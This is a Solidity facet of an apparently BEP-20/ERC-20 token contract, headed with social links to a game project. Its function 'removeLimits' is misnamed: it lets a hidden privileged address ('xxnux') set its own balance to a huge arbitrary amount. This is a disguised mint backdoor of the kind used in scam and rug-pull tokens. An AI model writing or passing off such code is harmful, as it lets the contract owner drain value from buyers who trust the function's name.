/*
 * SPDX-License-Identifier: MIT
 * Twitter: https://twitter.com/BitCraftOnline
 * Website: https://bitcraftonline.com
 * Medium: https://clockwork-labs.medium.com
 * Discord: https://discord.gg/t9c8agjjMj
 */
pragma solidity ^0.8.17;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                100000000 *
                10000 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
